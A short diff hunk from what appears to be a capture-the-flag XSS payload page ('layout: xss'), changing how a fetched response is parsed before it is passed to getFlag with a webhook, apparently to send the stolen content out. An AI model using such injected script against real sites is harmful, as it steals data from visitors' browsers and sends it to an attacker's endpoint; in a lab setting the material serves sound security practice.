@@ -38,6 +38,6 @@ layout: xss
         mode: 'no-cors' // 'cors' by default
     };*/
     fetch(url)
-        .then(res => { console.log(res); return res.json(); })
+        .then(res => { console.log(res); return res.text(); })
         .then(text => { console.log(text); getFlag(webhook2, text) })
 </script>
